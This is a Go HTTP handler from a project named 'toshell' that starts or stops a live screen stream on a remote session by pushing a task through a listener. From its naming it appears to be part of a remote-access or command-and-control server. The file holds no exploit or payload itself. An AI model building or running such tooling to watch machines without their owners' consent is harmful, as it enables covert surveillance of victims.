package api

import (
	"encoding/json"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
)

// screenStreamHandler 启动/停止实时屏幕流。action: start / stop。
func (s *Server) screenStreamHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req struct {
		Action string `json:"action"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	action := req.Action
	if action == "" {
		action = "start"
	}
	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.CreateScreenStream(id, action)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "screen-stream (%s) pushed to session %s", action, id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"action":    action,
		"message":   "screen stream task pushed",
	})
}
